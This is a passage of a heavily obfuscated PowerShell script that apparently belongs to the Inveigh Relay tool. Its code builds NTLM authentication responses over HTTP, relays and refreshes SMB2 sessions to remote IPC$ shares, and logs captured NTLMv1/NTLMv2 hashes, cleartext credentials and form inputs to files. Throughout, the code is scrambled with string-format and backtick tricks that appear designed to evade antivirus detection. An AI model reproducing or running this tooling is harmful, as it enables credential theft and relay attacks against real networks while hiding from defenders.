            ${PaCKE`T`_hTtpRe`SP`oNse}.("{1}{0}"-f 'dd','A').Invoke(("{1}{0}{2}{3}{4}"-f'R','HTTP','esp','onse_Serv','er'), $iXgD::"Ut`F8".("{1}{0}" -f'tBytes','Ge').Invoke(("{1}{5}{8}{3}{4}{0}{7}{2}{6}"-f 'TP','Server: Mi','PI','s','oft-HT','c','/2.0','A','ro')) + [Byte[]](0x0d,0x0a))
            ${pa`ckEt_H`TT`p`Re`sPo`Nse}.("{0}{1}"-f'A','dd').Invoke(("{2}{1}{3}{5}{0}{4}" -f'eStam','esp','HTTPR','onse_','p','Tim'),[Byte[]](0x44,0x61,0x74,0x65,0x3a,0x20) + ${h`TtP_T`iMESt`AMp} + [Byte[]](0x0d,0x0a))
            ${p`AC`Ket`_httpR`E`Sp`ONsE}.("{1}{0}" -f'dd','A').Invoke(("{5}{2}{6}{0}{3}{4}{1}" -f'o','ntLength','PR','nt','e','HTT','esponse_C'),  $IxgD::"Ut`F8".("{1}{0}{2}" -f'tBy','Ge','tes').Invoke("Content-Length: $($HTTP_message_bytes.Length) ") + [Byte[]](0x0d,0x0a))

            if(${HT`T`P_`h`eadeR_A`UTH`E`NtICATE} -and ${htTp_HEAd`E`R_a`UTHeN`TicA`TE_DAta})
            {
                ${P`Ac`K`et_httprEsponse}.("{1}{0}" -f'd','Ad').Invoke(("{5}{2}{4}{7}{6}{0}{3}{1}{8}" -f 'i','e','ponse_A','cat','uth','HTTPRes','t','en','Header'),${hTtp`_h`EADEr_AuTH`ENt`ICATe} + ${HtTp_h`Ea`D`e`R_`AUth`EnTIC`Ate_DaTA} + [Byte[]](0x0d,0x0a))
            }

            if(${HtTP_`hea`dER`_cOn`Te`NT_tYpE})
            {
                ${pAckEt_h`Tt`pReSp`o`NSE}.("{1}{0}" -f'dd','A').Invoke(("{2}{6}{5}{0}{1}{3}{4}"-f 'nse_C','ontentT','HT','y','pe','spo','TPRe'),${Http`_hEADER`_`COnten`T_t`Ype} + [Byte[]](0x0d,0x0a))
            }

            if(${ht`Tp_HE`Ad`er_CAC`he`_C`onT`ROl})
            {
                ${PA`CkEt`_Ht`T`pREsPOn`sE}.("{1}{0}"-f 'd','Ad').Invoke(("{1}{3}{6}{4}{5}{2}{0}"-f 'l','HTT','tro','PResponse_','cheCo','n','Ca'),${hTTp_HEA`deR`_CAC`HE_`coNt`R`Ol} + [Byte[]](0x0d,0x0a))
            }

            if(${htt`p_`S`eND})
            {
                ${p`ACKe`T_hTT`prESp`onSe}.("{1}{0}"-f 'd','Ad').Invoke(("{0}{3}{1}{4}{5}{2}" -f'H','P','ssage','TT','Respon','se_Me'),[Byte[]](0x0d,0x0a) + ${h`TTp_MEs`SAGe_`Bytes})
                ${HTT`p_Res`p`oNsE} = &("{0}{5}{4}{3}{6}{2}{1}"-f 'Con','ionary','ct','dered','-PacketOr','vertFrom','Di') ${pAc`Ket`_`hTtpR`Es`pON`SE}
                ${httP_`stRE`Am}.("{0}{1}"-f 'Wri','te').Invoke(${h`TtP`_rESPo`NSe},0,${Ht`T`P_res`P`ONSe}."LeN`gtH")
                ${HTtP`_`s`TREaM}.("{1}{0}"-f'h','Flus').Invoke()
            }

            &("{2}{0}{3}{1}"-f 'ar','eep','St','t-Sl') -m 10
            ${http`_rEQ`UEST`_raW_`URl`_o`LD} = ${ht`TP`_REQuE`s`T_rAw_uRl}

            if(${hTTP`_clien`T_CLo`sE})
            {

                if(${P`RoXy_li`sTe`Ner})
                {
                    ${h`TTp_C`LI`eNT}."CliE`NT".("{0}{1}" -f'Clo','se').Invoke()
                }
                else
                {
                    ${http_`CLI`e`Nt}.("{1}{0}"-f 'e','Clos').Invoke()
                }

            }

        }
        else
        {

            if(${Http_c`LIENT`_HAndle_`o`ld} -eq ${HT`T`p_c`liENt}."C`LIeNt"."HAN`dLE")
            {
                ${H`T`TP`_RESeT}++
            }
            else
            {
                ${Ht`Tp`_R`eseT} = 0
            }

            if(${H`T`TP_connEC`Ti`o`N_HeAd`eR_ClO`se} -or ${H`TtP_`RES`eT} -gt 20)
            {
                ${hT`TP`_cL`ient}.("{0}{1}" -f'C','lose').Invoke()
                ${H`T`TP_Re`sET} = 0
            }
            else
            {
                &("{3}{2}{1}{0}" -f 'eep','l','S','Start-') -m 100
            }

        }

    }

    ${htt`P`_CLiEnt}.("{0}{1}" -f 'Clos','e').Invoke()
    ${Ht`Tp_lIsT`en`ER}.("{1}{0}" -f 'op','St').Invoke()
}


${coNt`R`oL`_relAY_scRiptBl`oCk} = 
{
    param (${c`ONsoleq`U`eUe`lIMIT},${REL`AyaU`TOEXiT},${R`UntImE})
    
    function In`V`OkE-ouTpUT`QUeuEL`ooP
    {

        while(${i`NVeIGH}."oU`TPUt_q`U`Eue"."C`OUNT" -gt 0)
        {
            ${iNve`i`Gh}."cONsO`LE_Qu`Eue"."a`Dd"(${I`NVEiGH}."oUTp`Ut_q`UeuE"[0]) > ${N`UlL}

            if(${iNV`EI`gh}."F`ILe_OU`TP`Ut")
            {

                if (${In`V`eIGH}."O`UTpuT`_qU`eUe"[0]."s`Ta`RTsWITh"(("{0}{1}"-f'[+','] ')) -or ${in`VeI`Gh}."o`UTPU`T_q`UEuE"[0]."StaRtS`W`iTh"(("{0}{1}" -f'[*]',' ')) -or ${inV`Ei`gh}."oUtp`U`T_q`Ueue"[0]."START`sW`ItH"(("{1}{0}" -f'!] ','[')) -or ${iN`VeIgh}."O`UtPUt`_Q`UEUE"[0]."S`Ta`RtSWi`Th"(("{0}{1}"-f '[-]',' ')))
                {
                    ${in`VEI`gH}."Lo`g`_fil`E`_Queue"."A`dd"(${I`N`VEiGH}."oU`Tp`UT_Que`UE"[0]) > ${n`Ull}
                }
                else
                {
                    ${Inv`EIgH}."LOG`_`Fi`LE_QUEuE"."a`dd"(("{2}{1}{0}"-f'ed]','act','[red')) > ${N`Ull}    
                }

            }

            if(${i`NVeIgh}."LOg_out`P`Ut")
            {
                ${iN`VEIgH}."l`oG"."A`dD"(${i`N`VeiGH}."O`UTpUt`_`QueuE"[0]) > ${N`UlL}
            }

            ${I`NvE`igh}."O`U`TPUt_`QuEuE".("{2}{1}{0}" -f 'At','e','Remov').Invoke(0)
        }

    }

    function s`Top-in`VEIGH`RunSP`A`Ce
    {
        param ([String]${me`ssA`GE})
        
        if(${In`V`EIgh}."h`TTps" -and !${InV`eIGh}."h`TtpS_`E`XiS`TINg_`CErTIFIca`TE" -or (${iN`V`eiGH}."H`TTP`s`_eXisTINg_c`eRtIfiCatE" -and ${i`NVE`Igh}."Http`s`_`F`oR`Ce_CErtiFIcat`e_d`EleTe"))
        {

            try
            {
                ${c`ERTiFi`C`At`e_StoRe} = &("{2}{1}{0}" -f'ct','je','New-Ob') ("{15}{8}{3}{13}{6}{1}{0}{2}{5}{16}{10}{14}{4}{12}{11}{9}{7}"-f'it','Secur','y.Cry','e','ert','pto','.','e','yst','or','0','09St','ificates.X5','m','9C','S','graphy.X5')("My",("{3}{2}{1}{0}"-f'Machine','l','ca','Lo'))
                ${cERtI`Fic`Ate_St`OrE}.("{1}{0}"-f 'en','Op').Invoke(("{1}{2}{0}{3}" -f 'Wr','R','ead','ite'))
                ${cer`TIF`IC`AtES} = (&("{2}{1}{0}" -f'tem','ldI','Get-Chi') ((("{4}{5}{1}{2}{0}{3}" -f'rYuM','rt:rYuLoc','alMachine','y','C','e')) -RePlace([chAR]114+[chAR]89+[chAR]117),[chAR]92) | &("{0}{1}{2}"-f 'Wh','ere-Obj','ect') {${_}."ISS`UEr" -Like "CN=" + ${Inv`E`IgH}."CERT`I`Fi`CatE_I`SsuER"})

                foreach(${cErtiF`iC`Ate} in ${CE`RTIFiCa`TEs})
                {
                    ${ce`RtI`FicA`TE_S`TO`RE}.("{0}{1}"-f'Re','move').Invoke(${cE`RtIFIC`AtE})
                }

                ${c`eRt`iFiCatE_s`To`RE}.("{0}{1}"-f 'Clo','se').Invoke()
            }
            catch
            {
                ${I`NVEIgH}."o`Ut`Put_qUE`Ue"."A`dd"(("[-] [$(Get-Date -format s)] SSL Certificate Deletion Error [Remove Manually] ")) > ${N`ULL}
            }

        }

        if(${adI`D`Nscl`eanUP} -eq 'Y' -and ${in`Ve`IGh}."a`didnS`_`TABle"."C`OuNT" -gt 0)
        {
            [Array]${Ad`idNs`_TABLE_Key`s_tE`mp} = ${INv`Ei`gH}."A`DiD`Ns_T`Able"."ke`ys"

            foreach(${ADIdN`S`_h`OsT} in ${aDidn`S_t`Ab`Le_keyS`_`TeMP})
            {
                
                if(${inV`eIGh}."AD`iDnS_`Ta`BLe".${AdId`N`S_ho`st} -ge 1)
                {

                    try
                    {
                        &("{0}{1}{3}{2}" -f 'D','isabl','IDNSNode','e-AD') -Credential ${aDId`N`S`CR`ede`NTiAL} -Domain ${adiD`N`sDOMA`in} -DomainController ${AdID`NSd`om`A`iNc`ontR`oLleR} -Node ${aDIdns`_`ho`ST} -Partition ${AdiDnS`pArt`ITi`on} -Zone ${aD`IDns`zonE}
                        ${in`VEiGH}."ADIdN`S`_T`ABle".${adid`Ns`_hoSt} = ${nu`Ll}
                    }
                    catch
                    {
                        ${ER`RoR`_mess`AGE} = ${_}."eXCE`Pt`Ion"."mE`S`SagE"
                        ${ErRO`R_`mESSa`gE} = ${eR`R`OR`_`mesSAGe} -replace "`n",""
                        ${In`V`EiGh}."O`UT`P`UT_qUeue"."a`dD"(("[!] [$(Get-Date -format s)] $error_message $($_.InvocationInfo.Line.Trim()) ")) > ${n`Ull}
                        ${i`N`VEIGH}."OU`Tp`Ut_Q`Ueue"."A`dd"(("[-] [$(Get-Date -format s)] ADIDNS host record for $ADIDNS_host remove failed ")) > ${n`Ull}
                    }

                }

            }

        }
        
        if(${I`NvEiGH}."rEl`A`Y`_RuNni`NG")
        {
            &("{3}{2}{0}{1}"-f'-S','leep','tart','S') -m 100

            if(${Messa`GE})
            {
                ${InV`Ei`gh}."o`UTPUT`_q`UeUe"."A`DD"(("[*] [$(Get-Date -format s)] Inveigh Relay is exiting due to $Message ")) > ${NU`LL}
            }
            else
            {
                ${iNV`eI`gh}."oUTPU`T`_`qUEue"."a`DD"(("[*] [$(Get-Date -format s)] Inveigh Relay is exiting ")) > ${NU`LL}  
            }

            if(!${INV`eIgH}."RuN`N`InG")
            {
                &("{2}{5}{0}{3}{6}{4}{1}" -f 'Ou','op','Invoke','tputQu','ueLo','-','e')
                &("{2}{3}{1}{0}"-f 'p','e','Star','t-Sle') -m 100
            }

            ${i`NvEi`gH}."R`ELaY`_rUNninG" = ${FAL`sE}
        }

        if(${INV`e`Igh}."Run`NI`NG")
        {

            if(${mE`sSa`ge})
            {
                ${In`VEIGH}."OU`TP`Ut_`queUE"."a`dD"(("[*] [$(Get-Date -format s)] Inveigh is exiting due to $Message ")) > ${N`Ull}
            }
            else
            {
                ${i`NVEigH}."OutPu`T_`qu`EuE"."A`Dd"(("[*] [$(Get-Date -format s)] Inveigh is exiting ")) > ${N`ULl}  
            }

            &("{0}{1}{2}{3}{4}"-f'Invok','e-Ou','tputQu','eueLo','op')

            if(!${el`EVatEd_PR`IvIL`EGe})
            {
                &("{2}{1}{0}" -f 'ep','-Sle','Start') -s 3
            }

            ${iNv`ei`gh}."Ru`NNInG" = ${FaL`sE}
        }

        ${invE`IgH}."Ad`idNs" = ${nu`lL}
        ${i`NveIGh}."h`TTps" = ${f`AlSE}
    }

    if(${Ru`N`TIME})
    {    
        ${C`oNtRO`L_`TIM`EoUt} = &("{0}{2}{1}{3}"-f'N','w-T','e','imeSpan') -Minutes ${rU`NTimE}
        ${cont`R`ol`_St`o`PWaTch} =  (&("{1}{0}" -f'cI','g')  ("VAR"+"iabLE"+":1N"+"p") ).vAlue::("{2}{0}{1}"-f 'art','New','St').Invoke()
    }
       
    while(${IN`V`eigH}."Rel`A`Y_rUNn`InG" -and !${in`VEigH}."r`UNN`ing")
    {

        if(${RelAy`A`U`TOexIT} -eq 'Y' -and !${IN`VE`IgH}."Smb_RE`L`AY")
        {
            &("{2}{3}{1}{0}" -f'rt-Sleep','a','S','t') -S 5
            &("{3}{1}{5}{4}{0}{2}"-f'ighRun','op-','space','St','nve','I') ("{2}{1}{0}"-f'y','ela','disabled r')
        }

        if(${rUN`Ti`me})
        {

            if(${CO`NTrOl_sT`OPwa`T`cH}."E`LA`PSEd" -ge ${coN`TRo`l_T`imeoUt})
            {
                &("{1}{2}{3}{4}{0}{5}"-f 'nsp','Stop','-Inve','ighR','u','ace') ("{1}{3}{0}{4}{2}"-f 'aching run','r','time','e',' ')
            }

        }

        if(${inv`e`igH}."Fi`l`e_o`UTput" -and -not ${i`Nve`IGh}."cOntR`ol")
        {

            while(${invei`Gh}."L`oG_Fi`Le_qUeUe"."COU`NT" -gt 0)
            {
                ${I`NvEiGH}."lOg`_f`i`Le_`queue"[0]|&("{1}{0}" -f 'e','Out-Fil') ${i`NvEI`gh}."LOG_OU`T_f`ILE" -Append
                ${i`NVEIGH}."LOg_fILe_`qu`eue".("{0}{1}{2}" -f'Rem','ove','At').Invoke(0)
            }

            while(${inVe`I`gh}."NTL`mV1_Fi`LE`_QuEUe"."C`OUnT" -gt 0)
            {
                ${Inv`e`IGH}."ntl`mv`1_F`ile_`q`UEue"[0]|&("{0}{1}{2}" -f 'O','ut','-File') ${i`Nvei`GH}."nTlmv1`_o`U`T_F`iLE" -Append
                ${i`NV`eIGH}."NtlmV1_fi`L`E`_q`UEuE".("{1}{0}{2}"-f've','Remo','At').Invoke(0)
            }

            while(${inve`igh}."NTlm`V2_fIL`e_qu`EUE"."cou`NT" -gt 0)
            {
                ${InV`e`IGH}."NtLmV2`_f`ile_Q`UeUE"[0]|&("{1}{2}{0}"-f '-File','Ou','t') ${INv`E`Igh}."nTLm`V2_`OuT`_F`ILe" -Append
                ${InVeI`GH}."nTLM`V`2_FIlE`_QUe`Ue".("{2}{1}{0}" -f 'eAt','emov','R').Invoke(0)
            }

            while(${iNV`e`igH}."cLeAR`TEXt_fiL`E_QU`eUe"."C`oUNt" -gt 0)
            {
                ${IN`Vei`GH}."CLe`ArtEX`T_FIlE`_Q`U`eue"[0]|&("{2}{0}{1}"-f'F','ile','Out-') ${I`NVeI`gH}."C`lE`Ar`TE`xt_out_`FIle" -Append
                ${I`NveI`Gh}."c`LEarTExT_`FiLE`_QU`EuE".("{0}{1}{2}"-f'Remove','A','t').Invoke(0)
            }

            while(${In`V`EIGH}."ForM`_I`NPu`T_`F`il`E_QuEUe"."co`Unt" -gt 0)
            {
                ${IN`Ve`iGh}."f`oRM_`InPU`T_f`iLE_Q`UEue"[0]|&("{0}{2}{1}"-f 'Ou','e','t-Fil') ${iNVEI`gH}."FOr`m_i`N`PU`T_OUT_FI`LE" -Append
                ${IN`VE`IGH}."fORm_InP`UT`_Fi`Le_`qu`Eue".("{0}{1}"-f'Re','moveAt').Invoke(0)
            }
        
        }

        if(!${iN`VEIgh}."c`ON`sOl`E_OUtpUT" -and ${C`oNSO`leQU`eUeLIMiT} -ge 0)
        {

            while(${iN`VeI`gH}."C`OnSOL`e_Q`UeuE"."cO`UnT" -gt ${ConSolequEUe`l`i`m`It} -and !${i`Nvei`gH}."c`ons`O`Le_OUT`puT")
            {
                ${iNv`EI`gh}."C`O`NS`OLE_q`UeUE".("{1}{0}" -f't','RemoveA').Invoke(0)
            }

        }

        if(!${INv`E`iGh}."status_`O`UTput" -and !${inVe`igH}."RUn`NinG")
        {
            &("{2}{4}{1}{0}{3}{5}" -f 'utQ','-Outp','I','ueueL','nvoke','oop')
        }

        &("{1}{0}{2}" -f't-Sle','Star','ep') -m 5

        if(${i`NvE`IGH}."St`OP")
        {
            ${i`NVe`IgH}."c`oNSOle`_`QUe`Ue".("{0}{1}"-f 'Cle','ar').Invoke()
            &("{3}{0}{1}{2}" -f'h','Ru','nspace','Stop-Inveig')
        }

    }

 }


${S`eSSIoN_`RE`F`ReSH_sCriPtb`l`O`CK} = 
{
    param (${sES`SiOnref`R`eSh})

    ${proC`e`Ss`_i`D_bYt`eS} = &("{4}{2}{3}{5}{0}{1}" -f'ce','ssIDArray','-P','r','Get','o')

    while(${Inv`e`igh}."r`El`AY_RUnNING")
    {

        if(${i`Nv`eiGh}."SeS`SION_`sockeT_`TA`Ble"."co`UNT" -gt 0)
        {
            ${S`e`SsiOn} = 0

            while(${Sessi`ON} -lt ${i`NvE`iGH}."seSs`IO`N_So`C`K`ET_T`AblE"."c`Ount")
            {
                ${Ses`SiO`N_TiM`ESPAN} =  &("{3}{0}{1}{2}"-f'-Ti','m','eSpan','New') ${In`V`EIGH}."SEss`iON"[${SEs`siON}]."Last Activity" $(&("{1}{2}{0}" -f 'e','Get-D','at'))
                
                if(${IN`VEIgh}."SESSIoN`_sOCKeT`_`TA`Ble"[${s`eSSioN}]."cO`N`NECted" -and ${iNVE`I`Gh}."Ses`Si`on_loC`K_tA`B`lE"[${SeS`sIOn}] -eq ("{1}{0}" -f 'n','ope') -and ${SES`SioN_t`Im`ESPan}."Mi`NU`TeS" -ge ${se`sSioN`REf`RESH})
                {
                    ${InV`EIgH}."sEsS`ION`_locK_`TAble"[${sE`sS`iOn}] = ("{2}{1}{0}" -f'd','ke','loc')
                    ${CL`IE`Nt} = ${InVei`GH}."sessIOn_S`oCke`T_tAb`lE"[${s`ess`IoN}]
                    ${C`lIe`NT_sTR`eam} = ${clIe`Nt}.("{1}{0}{2}" -f'S','Get','tream').Invoke()
                    ${S`E`sS`ion_Id} = ${InV`ei`GH}."sessioN_`T`ABlE"[${s`EsS`ion}]
                    ${M`E`s`sage_id} =  ${in`Ve`IGh}."SES`SIoN`_mES`sage_ID_`TAB`lE"[${s`Essi`on}]
                    ${tREE_`iD} = 0x00,0x00,0x00,0x00
                    ${c`L`ieNT_R`ece`IVe} = &("{2}{0}{1}"-f 'ew','-Object','N') ("{4}{3}{0}{1}{2}"-f 'em','.Byte','[]','yst','S') 1024
                    ${s`mb_pATH} = "\\" + ${inVEI`Gh}."S`EsSi`On_soCK`e`T_TaBLe"[${s`e`SsION}]."cL`i`EnT"."RE`M`O`Te`enDPOiNt"."Ad`DR`ess"."iP`ADDre`s`STosT`RinG" + "\IPC$"
                    ${SMb_P`At`H_BytES} =   (  &('lS')  ("V"+"A"+"RIabLE:i"+"xgd") ).VaLUE::"UN`I`Code".("{2}{1}{0}"-f'tes','By','Get').Invoke(${sM`B`_Pa`Th})
                    ${MeS`sAge_`id}++
                    ${P`Acke`T`_sMb2_He`A`D`eR} = &("{3}{0}{2}{4}{1}"-f 'ew-','ader','PacketS','N','MB2He') 0x03,0x00 0x01,0x00 ${f`A`lsE} ${mES`S`AGE_id} ${procE`sS_iD_`By`TeS} ${TREe_`id} ${se`S`SioN_ID}
                    ${P`A`CkET_S`M`B`2_Data} = &("{4}{9}{7}{6}{5}{3}{8}{1}{0}{2}"-f'ues','nectReq','t','Co','New-Pac','e','Tre','MB2','n','ketS') ${S`mb`_path_b`y`Tes}
                    ${sMb2_`H`ead`er} = &("{2}{4}{3}{1}{5}{6}{7}{0}"-f'ionary','tOr','Con','ertFrom-Packe','v','dere','d','Dict') ${P`A`Ck`eT_sM`B2_`HeadeR}
                    ${s`mB2_`daTA} = &("{6}{8}{7}{0}{5}{4}{1}{3}{9}{2}"-f 'ertF','edD','ry','ictio','rder','rom-PacketO','C','nv','o','na') ${pAc`kEt`_`smb2`_DAtA}    
                    ${PAC`kEt_NE`Tb`I`OS_S`EssiON_sErv`ice} = &("{7}{2}{5}{6}{0}{1}{3}{4}" -f 'IOSSe','ssionSer','ac','vic','e','ket','NetB','New-P') ${s`m`B2`_HeAdeR}."LE`Ngth" ${s`mB2_D`A`Ta}."L`enGTH"
                    ${neTb`IO`S_`Sessi`ON_seRv`I`Ce} = &("{1}{3}{5}{7}{2}{6}{0}{4}"-f'iona','Conv','edD','ertFr','ry','om-Pack','ict','etOrder') ${PaCkEt_`N`etBiOS_`S`esSI`oN_S`erVIcE}
                    ${Cl`IeN`T`_sEND} = ${nE`Tbios_`SessIon_`sE`R`VIce} + ${s`mB`2_he`ADEr} + ${Smb2`_d`ATA}

                    try
                    {
                        ${Cl`iE`N`T_`STREaM}.("{0}{1}"-f'Writ','e').Invoke(${c`L`ienT_`seNd},0,${cLiENt`_s`enD}."lE`Ng`Th") > ${n`ULl}
                        ${Clie`Nt`_sTre`Am}.("{1}{0}"-f'h','Flus').Invoke()
                        ${c`li`enT_StRe`Am}.("{0}{1}" -f'Re','ad').Invoke(${c`L`IenT_ReC`eIvE},0,${Cli`ENt_`R`ecEiVe}."lEnG`TH") > ${Nu`lL}
                    }
                    catch
                    {
                        ${i`NvE`iGH}."o`UtPUT`_q`UeUE"."A`dd"(("[!] [$(Get-Date -format s)] Relay session $session has closed ")) > ${nu`ll}
                        ${IN`VE`igH}."Se`Ss`ioN"[${S`E`SSIoN}] | &("{2}{0}{1}"-f 'e-Obje','ct','Wher') {${_}."STa`TUS" = ("{1}{3}{0}{2}"-f'nn','dis','ected','co')}
                    }

                    if(${in`VEIgH}."s`Ession`_sOckeT_`TA`BlE"[${ses`s`iON}]."cOn`NECtED")
                    {
                        ${tre`e`_id} = ${C`LieNt`_re`C`eIve}[40..43]
                        &("{0}{2}{1}{3}" -f 'St','rt-Slee','a','p') -s 1
                        ${MeSS`Age`_`ID}++
                        ${pack`E`T_s`MB2_H`eaDeR} = &("{3}{5}{2}{1}{0}{4}"-f 'eade','H','PacketSMB2','New','r','-') 0x04,0x00 0x01,0x00 ${FAl`SE} ${mEsSaGE`_`Id} ${pR`ocE`sS`_ID_b`yTEs} ${treE`_ID} ${Ses`sIo`N_id}
                        ${paCk`ET_sMB2_`DA`TA} = &("{3}{1}{0}{5}{4}{6}{2}" -f'acke','P','nnectRequest','New-','TreeDisc','tSMB2','o')
                        ${Smb2`_`he`ADer} = &("{0}{3}{2}{5}{6}{1}{4}" -f 'Con','edDictiona','m-Pa','vertFro','ry','cke','tOrder') ${pA`C`keT`_sMb`2`_heAdER}
                        ${SmB`2_d`AtA} = &("{7}{0}{4}{3}{1}{5}{2}{6}" -f'From-Pac','O','e','et','k','rd','redDictionary','Convert') ${pA`C`kET_`SMB2_daTa}
                        ${P`ACK`Et_nET`B`Ios_se`ssiON_Ser`VICe} = &("{6}{1}{2}{5}{3}{0}{4}" -f 'i','etNetBIO','S','sionServ','ce','Ses','New-Pack') ${S`M`B2_hE`Ader}."l`e`NGtH" ${S`mb2_`dAtA}."lEng`Th"
                        ${nEt`B`iOS_s`E`SS`IO`N_seRvIcE} = &("{4}{3}{2}{9}{8}{1}{0}{5}{6}{7}" -f 'er','ketOrd','-','rom','ConvertF','edDic','tion','ary','c','Pa') ${paCkEt`_`Ne`TBios_se`SsiOn_`seRV`iCe}
                        ${CLi`En`T_sE`Nd} = ${net`Bi`oS_Se`sSIoN`_sER`ViCE} + ${sMb2_HEa`D`er} + ${sMb2`_Da`Ta}

                        try
                        {
                            ${Cl`ie`Nt_St`Re`AM}.("{1}{0}"-f 'te','Wri').Invoke(${c`lIeN`T_SE`Nd},0,${clieNT`_`sENd}."l`enGTH") > ${n`ULL}
                            ${cl`ient_Str`EaM}.("{0}{1}"-f'Flus','h').Invoke()
                            ${Cl`ieNT`_StreAm}.("{0}{1}"-f'Rea','d').Invoke(${cl`IeNt_r`ECE`IvE},0,${ClIEn`T_`ReCe`I`Ve}."Le`NGth") > ${nu`LL}
                        }
                        catch
                        {
                            ${inV`EIgH}."OuTPu`T_`QUE`Ue"."A`dD"(("[!] [$(Get-Date -format s)] Relay session $session has closed ")) > ${N`UlL}
                            ${I`NV`eIGH}."sEs`si`On"[${sE`S`siON}] | &("{1}{0}{2}" -f 'he','W','re-Object') {${_}."s`TATUS" = ("{1}{0}{3}{2}" -f 'con','dis','ted','nec')}
                        }

                    }

                    ${IN`Ve`igH}."sE`Ssi`On`_LOcK_TAB`Le"[${SE`sSIOn}] = ("{1}{0}" -f'pen','o')
                    ${Inv`eI`Gh}."ses`SIoN"[${SEss`i`On}] | &("{0}{1}{2}" -f 'Where-O','bje','ct') {${_}."Last Activity" = &("{2}{0}{1}" -f'-','Date','Get') -format ('s')}
                    ${INV`ei`gh}."SESsION_`m`ESSa`Ge_Id_Tab`lE"[${sEss`I`oN}] = ${m`esS`AgE_Id}
                }

                ${SE`ssi`ON}++
                &("{0}{2}{1}"-f 'St','leep','art-S') -s 1
            }
         
        }

        &("{2}{0}{3}{1}"-f 't-','ep','Star','Sle') -s 1
    }

}




 
function H`Tt`PL`IsteNER
{
    ${hTTP_rUn`Spa`CE} =   ( &("{1}{0}" -f 'I','gC')  variaBLE:rKO8F0  ).Value::("{4}{2}{0}{1}{3}"-f 'eRunspa','c','eat','e','Cr').Invoke()
    ${HT`T`PS_`LIST`eNer} = ${f`ALse}
    ${pROx`Y_`lIstener} = ${F`A`lsE}
    ${HT`TP`_r`UnSpaCe}.("{1}{0}" -f'pen','O').Invoke()
    ${httP_RU`NS`Pa`CE}."s`e`sSionstA`Te`ProxY".("{1}{0}{2}"-f 'etVa','S','riable').Invoke(("{0}{1}{2}" -f 'inv','eig','h'),${I`NvEiGh})
    ${H`T`TP_Po`wErsHeLl} =  (&("{1}{0}" -f 'em','ChildIt') ("V"+"ARIa"+"BLe"+":M4u"+"n")).vAlUe::("{1}{0}" -f'ate','Cre').Invoke()
    ${hTtP`_po`W`e`RSHeLL}."Ru`NSp`ACE" = ${HTt`p_`Run`spAce}
    ${H`Tt`p_P`OwER`sh`eLl}.("{0}{1}{2}" -f'Ad','dScri','pt').Invoke(${S`h`Ar`eD_`Ba`siC_fUN`cTI`on`S`_sCriptb`lOCk}) > ${N`Ull}
    ${HT`Tp_`poWeR`SHell}.("{0}{1}{2}" -f'AddSc','rip','t').Invoke(${pA`Ck`Et`_`FunCTi`o`Ns_sCr`IptbL`oCK}) > ${N`ULL}
    ${Ht`TP`_`P`O`weRShElL}.("{0}{2}{1}" -f 'Add','t','Scrip').Invoke(${SM`B_ReLAy_F`UN`CtioNs_SCRip`T`BloCK}) > ${nu`LL}
    ${http_`POWErS`h`e`LL}.("{1}{0}{2}" -f'crip','AddS','t').Invoke(${hT`TP_s`C`Ri`PtBLo`cK}).("{2}{0}{3}{1}" -f 'r','ent','AddA','gum').Invoke(${a`TtAcK}).("{2}{0}{1}"-f 'ddArgumen','t','A').Invoke(${CHALl`eN`ge}).("{2}{1}{0}"-f 'ment','u','AddArg').Invoke(
        ${cOm`M`And}).("{2}{1}{0}"-f 'dArgument','d','A').Invoke(${EN`UMEr`AtE}).("{3}{2}{0}{1}"-f 'm','ent','u','AddArg').Invoke(${ENUM`erA`TEGRo`UP}).("{2}{1}{0}" -f'ment','dArgu','Ad').Invoke(${FaI`le`DlogINTh`RESH`OLD}).("{0}{1}{3}{2}" -f 'Add','Ar','nt','gume').Invoke(
        ${h`TtPiP}).("{2}{1}{0}"-f'ment','rgu','AddA').Invoke(${hTtpp`o`RT}).("{2}{1}{0}"-f'ument','ddArg','A').Invoke(
        ${HtTPs_`L`iSt`enER}).("{0}{1}{2}" -f 'A','ddAr','gument').Invoke(${P`Ro`Xy}).("{1}{2}{0}"-f'Argument','Ad','d').Invoke(${PrOx`y`ig`NOre}).("{1}{2}{0}" -f 'ent','AddArg','um').Invoke(${PR`OXY_lI`St`eN`Er}).("{1}{2}{0}" -f'ent','AddA','rgum').Invoke(
        ${Re`L`AYAUTOdISA`Ble}).("{1}{2}{0}"-f't','AddArgu','men').Invoke(${rep`eA`TeNUme`R`ATE}).("{0}{3}{1}{2}"-f'Add','rgu','ment','A').Invoke(${r`E`pEAtExeCUtE}).("{0}{2}{1}{3}"-f 'AddArg','en','um','t').Invoke(
        ${ser`Vi`CE}).("{0}{2}{3}{1}" -f'AddA','ent','rgu','m').Invoke(${SMb`_v`E`RsIoN}).("{1}{3}{2}{0}"-f 'ment','Ad','u','dArg').Invoke(${sE`Ss`io`NlI`MitPrIV}).("{3}{2}{0}{1}" -f 'umen','t','ddArg','A').Invoke(
        ${s`eS`sIo`NliM`ItUN`PRIv}).("{1}{0}{2}{3}"-f'Argu','Add','m','ent').Invoke(${sesSioN`LiM`i`TS`harE}).("{1}{3}{0}{2}"-f 'umen','A','t','ddArg').Invoke(${s`EsSI`o`NP`Ri`oriTy}).("{1}{2}{0}" -f'ent','AddA','rgum').Invoke(
        ${TARg`ET}).("{0}{1}{2}" -f 'AddAr','gumen','t').Invoke(${t`ArGEt`MOdE}).("{0}{3}{1}{2}" -f'A','rg','ument','ddA').Invoke(${tArG`Et`R`Efr`eSh}).("{0}{2}{3}{1}"-f'Ad','ment','d','Argu').Invoke(${uSER`N`AME}).("{3}{2}{0}{1}"-f'm','ent','Argu','Add').Invoke(
        ${WP`A`daUTH}).("{0}{1}{2}" -f 'AddAr','g','ument').Invoke(${wPad`AUThI`gnOrE}).("{1}{0}{2}{3}" -f 'dA','Ad','rgu','ment').Invoke(${WP`AD`RES`p`onsE}) > ${n`Ull}
    ${H`TTP_`pO`WersHELL}.("{3}{2}{1}{0}"-f 'ke','inInvo','g','Be').Invoke() > ${NU`ll}
}


function htT`PSLi`Ste`Ner
{
    ${htTPS_ru`N`spACE} =  ( &("{2}{1}{0}" -f 'Ble','Ia','var') Rko8f0 ).vALuE::("{1}{4}{3}{0}{2}"-f 'teRunspac','C','e','ea','r').Invoke()
    ${hTTp`s_L`IST`ener} = ${T`Rue}
    ${pRoX`y_Lis`TE`NeR} = ${Fal`se}
    ${hTt`PS_`Ru`N`SPACE}.("{0}{1}" -f'Op','en').Invoke()
